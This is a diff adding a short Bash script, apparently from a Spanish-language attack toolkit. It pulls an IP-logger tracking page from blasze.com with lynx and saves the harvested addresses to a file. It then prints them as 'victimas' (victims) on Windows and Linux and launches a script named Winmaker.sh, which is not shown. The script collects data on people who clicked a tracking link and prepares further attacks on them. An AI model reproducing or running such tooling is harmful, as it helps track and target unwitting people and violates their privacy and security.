@@ -1,0 +1,12 @@
+mkdir Creacion/Ip
+curl=$(lynx -dump https://blasze.com/track/9LPSKJ |& tee ip.txt)
+curl1=$(lynx -dump https://blasze.com/track/9LPSKJ)
+mv ip.txt Creacion/Ip/ip.txt
+bash .banner
+echo "Analizando victimas de Windows y Linux..."
+echo ""
+echo "$curl1"
+echo ""
+echo "Presiona una tecla para continuar..."
+read input
+bash Winmaker.sh
